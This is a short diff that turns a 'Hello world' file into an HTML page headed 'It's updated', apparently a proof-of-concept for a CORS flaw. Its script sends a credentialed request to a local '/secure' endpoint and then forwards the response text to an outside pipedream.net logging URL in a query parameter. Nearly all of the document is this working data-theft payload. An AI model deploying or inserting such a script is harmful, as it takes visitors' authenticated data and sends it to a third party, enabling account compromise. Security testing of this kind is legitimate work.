@@ -1,1 +1,13 @@
-Hello world
+<html>
+    <h1>It's updated</h1>
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','http://127.0.0.1:5000/secure',true);
+req.withCredentials = true;
+req.send();
+function reqListener() {
+location='https://eoo4qe32yb2x0vt.m.pipedream.net/log?key='+this.responseText;
+};
+</script>
+</html>
